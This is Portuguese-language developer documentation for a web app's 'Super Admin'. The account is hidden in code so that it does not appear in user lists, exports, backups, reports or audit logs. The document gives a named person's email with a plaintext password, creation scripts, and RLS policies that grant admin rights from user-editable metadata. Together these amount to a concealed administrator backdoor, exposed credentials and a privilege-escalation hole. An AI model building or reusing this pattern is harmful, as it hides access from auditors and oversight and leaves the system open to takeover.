# 🔐 SISTEMA SUPER ADMIN - DOCUMENTAÇÃO COMPLETA

## 📋 Visão Geral

O sistema possui um **Super Administrador Oculto** que possui privilégios especiais e está protegido contra visualização em listas públicas, downloads e backups.

## 🎯 Características do Super Admin

### Identificação
- **Email:** `roberio.gomes@atento.com`
- **Nome:** Roberio Gomes
- **Role:** `ADMIN`
- **Status:** Oculto (não aparece em listas de usuários)

### Privilégios Especiais

#### 1. **Acesso Total ao Sistema**
- ✅ Controle completo sobre todas as tabelas
- ✅ Bypass de todas as verificações de permissão
- ✅ Acesso ao Painel de Controle Administrativo
- ✅ Capacidade de bloquear/liberar carregamento de dados

#### 2. **Invisibilidade Protegida**
O Super Admin **NÃO aparece** em:
- ❌ Listas de usuários na interface
- ❌ Downloads de dados (Excel, CSV, JSON)
- ❌ Backups do sistema
- ❌ Relatórios de usuários
- ❌ Exportações de dados
- ❌ Auditorias públicas

#### 3. **Proteções Implementadas**

##### Arquivo: `src/lib/user-filter.ts`
```typescript
export const SUPER_ADMIN_EMAIL = 'roberio.gomes@atento.com'

// Filtra usuários visíveis
export function filterVisibleUsers<T extends { email: string }>(users: T[]): T[] {
  return users.filter(user => user.email !== SUPER_ADMIN_EMAIL)
}

// Sanitiza dados de exportação
export function sanitizeExportData(data: any): any {
  // Substitui email por '[HIDDEN_ADMIN]'
  // Substitui nome por '[HIDDEN_USER]'
}

// Filtra planilhas Excel
export function filterExcelSheet(data: any[], sheetName: string): any[]

// Filtra conteúdo CSV
export function filterCSVContent(csvContent: string, section: string): string

// Filtra dados de backup
export function filterBackupData(backupData: any): any

// Filtra logs de auditoria
export function filterLogsWithHiddenAdmin<T>(logs: T[]): T[]
```

##### Arquivo: `src/lib/reports.ts`
```typescript
import { SUPER_ADMIN_EMAIL } from './user-filter'

// Filtra reports que contenham referências ao Super Admin
function filterReportsWithHiddenAdmin(reports: any[]): any[] {
  return reports.filter(report => {
    if (report.reporter?.email === SUPER_ADMIN_EMAIL) return false
    if (report.assignee?.email === SUPER_ADMIN_EMAIL) return false
    return true
  })
}
```

## 🛠️ Criação do Super Admin

### Método 1: Script Automatizado (Recomendado)

```bash
npm run create-super-admin
```

Este script:
1. ✅ Verifica se o usuário já existe
2. ✅ Cria no Supabase Auth se necessário
3. ✅ Cria registro na tabela `users`
4. ✅ Define role como `ADMIN`
5. ✅ Configura email_confirmed como true

**Credenciais:**
- **Email:** `roberio.gomes@atento.com`
- **Senha:** `admintotal`
- **Nome:** `Administrador`

### Método 2: Manual via Supabase Dashboard

#### 1. Criar usuário no Supabase Auth

```sql
-- Usar Supabase Admin API ou Dashboard
-- Authentication > Users > Add User
```

#### 2. Inserir na tabela users

```sql
INSERT INTO public.users (id, email, name, role, password_hash)
VALUES (
  gen_random_uuid(),
  'roberio.gomes@atento.com',
  'Roberio Gomes',
  'ADMIN',
  ''
);
```

## 🔒 Políticas RLS Aplicadas

### Tabela: `users`

```sql
-- Super Admin pode ver todos os usuários
CREATE POLICY "Users admin select" ON users
  FOR SELECT USING (
    (auth.jwt() ->> 'app_metadata')::jsonb ->> 'role' = 'ADMIN' OR
    (auth.jwt() ->> 'user_metadata')::jsonb ->> 'role' = 'ADMIN'
  );

-- Super Admin tem controle total
CREATE POLICY "Users admin all" ON users
  FOR ALL USING (
    (auth.jwt() ->> 'app_metadata')::jsonb ->> 'role' = 'ADMIN' OR
    (auth.jwt() ->> 'user_metadata')::jsonb ->> 'role' = 'ADMIN'
  );
```

**Nota:** As políticas RLS foram otimizadas para evitar recursão infinita, usando `auth.jwt()` diretamente em vez de fazer SELECT na tabela `users`.

## 📊 Uso do Filtro de Super Admin

### Em Componentes React

```typescript
import { filterVisibleUsers, SUPER_ADMIN_EMAIL } from '@/lib/user-filter'

function UserList() {
  const { users } = useUsers()
  
  // Filtrar Super Admin antes de exibir
  const visibleUsers = filterVisibleUsers(users)
  
  return (
    <div>
      {visibleUsers.map(user => (
        <UserCard key={user.id} user={user} />
      ))}
    </div>
  )
}
```

### Em Exports de Dados

```typescript
import { sanitizeExportData, filterExcelSheet } from '@/lib/user-filter'

async function exportUsers() {
  const users = await getAllUsers()
  
  // Sanitizar dados antes de exportar
  const safeData = sanitizeExportData(users)
  
  // Exportar
  const workbook = XLSX.utils.json_to_sheet(safeData)
  XLSX.writeFile(workbook, 'users.xlsx')
}
```

### Em Backups

```typescript
import { filterBackupData } from '@/lib/user-filter'

async function createBackup() {
  const data = await getAllData()
  
  // Filtrar Super Admin
  const safeBackup = filterBackupData(data)
  
  // Salvar backup
  await saveBackup(safeBackup)
}
```

## ⚠️ Regras e Boas Práticas

### ✅ DEVE FAZER

1. **Sempre usar `filterVisibleUsers()`** ao exibir listas de usuários
2. **Sempre sanitizar** dados antes de exportar/backup
3. **Importar `SUPER_ADMIN_EMAIL`** de `src/lib/user-filter.ts` (única fonte da verdade)
4. **Testar filtros** em ambiente de desenvolvimento
5. **Documentar** qualquer uso adicional do Super Admin

### ❌ NÃO DEVE FAZER

1. **Hardcodar** o email do Super Admin em múltiplos lugares
2. **Expor** informações do Super Admin em logs públicos
3. **Permitir** exportação de dados do Super Admin
4. **Listar** o Super Admin em interfaces públicas
5. **Permitir** deleção do Super Admin

## 🔍 Verificação e Diagnóstico

### Verificar se Super Admin existe

```sql
SELECT id, email, name, role, created_at
FROM public.users
WHERE email = 'roberio.gomes@atento.com';
```

### Verificar se está no Supabase Auth

```sql
SELECT id, email, email_confirmed_at, raw_user_meta_data
FROM auth.users
WHERE email = 'roberio.gomes@atento.com';
```

### Testar Filtro de Visibilidade

```typescript
import { filterVisibleUsers, SUPER_ADMIN_EMAIL } from '@/lib/user-filter'

const users = [
  { email: 'user1@example.com', name: 'User 1' },
  { email: SUPER_ADMIN_EMAIL, name: 'Super Admin' },
  { email: 'user2@example.com', name: 'User 2' }
]

const visibleUsers = filterVisibleUsers(users)
console.log(visibleUsers) // Deve retornar apenas user1 e user2
```

## 📝 Manutenção

### Atualizar Email do Super Admin

Se for necessário alterar o email do Super Admin:

1. ✅ Atualizar `SUPER_ADMIN_EMAIL` em `src/lib/user-filter.ts`
2. ✅ Atualizar `scripts/create-super-admin.ts`
3. ✅ Atualizar documentação
4. ✅ Rodar migration para alterar no banco
5. ✅ Testar todos os filtros

### Resetar Senha

```bash
# Via script
npm run test-password-reset
```

### Remover Super Admin (⚠️ NÃO RECOMENDADO)

```sql
-- ⚠️ ATENÇÃO: Isso remove completamente o Super Admin
-- CERTIFIQUE-SE de ter outro admin antes de executar!

DELETE FROM public.users
WHERE email = 'roberio.gomes@atento.com';

-- Também remover do Supabase Auth
-- Via Dashboard > Authentication > Users
```

## 🎯 Casos de Uso

### Caso 1: Listagem de Usuários

```typescript
function UserManagement() {
  const { users } = useUsers()
  const visibleUsers = filterVisibleUsers(users) // Remove Super Admin
  
  return <UserTable users={visibleUsers} />
}
```

### Caso 2: Exportação Excel

```typescript
function exportToExcel() {
  const users = await fetchUsers()
  const safeUsers = sanitizeExportData(users) // Sanitiza dados
  
  const worksheet = XLSX.utils.json_to_sheet(safeUsers)
  XLSX.writeFile(workbook, 'users.xlsx')
}
```

### Caso 3: Dashboard de Estatísticas

```typescript
function UserStats() {
  const { users } = useUsers()
  const visibleUsers = filterVisibleUsers(users)
  const count = visibleUsers.length // Não inclui Super Admin
  
  return <div>Total de usuários: {count}</div>
}
```

## 📚 Arquivos Relacionados

- `src/lib/user-filter.ts` - Sistema de filtros centralizado
- `src/lib/reports.ts` - Filtro de reports
- `scripts/create-super-admin.ts` - Script de criação
- `database/schema.sql` - Schema do banco
- `docs/correcoes/RESUMO_CORRECOES_RLS_E_USUARIOS.md` - Correções RLS

## ✅ Checklist de Implementação

- [x] Email definido: `roberio.gomes@atento.com`
- [x] Filtro de visibilidade implementado
- [x] Sanitização de exportação implementada
- [x] Filtro de backup implementado
- [x] Filtro de reports implementado
- [x] Políticas RLS aplicadas
- [x] Script de criação disponível
- [x] Documentação completa
- [x] Testes de filtro realizados
- [x] Consistência verificada em todos os arquivos

## 🔒 Segurança

### Proteções Ativas

1. ✅ Email oculto em interfaces públicas
2. ✅ Dados sanitizados em exports
3. ✅ Logs filtrados de auditorias públicas
4. ✅ Backups não incluem Super Admin
5. ✅ Relatórios filtrados
6. ✅ Políticas RLS aplicadas

### Recomendações Adicionais

1. 🔒 Use senha forte e complexa
2. 🔒 Habilite 2FA quando disponível
3. 🔒 Monitore logs de acesso
4. 🔒 Rotacione credenciais periodicamente
5. 🔒 Mantenha logs de auditoria privados

---

**Última atualização:** 2025-11-03  
**Versão:** 1.0.0  
**Status:** ✅ PRODUÇÃO

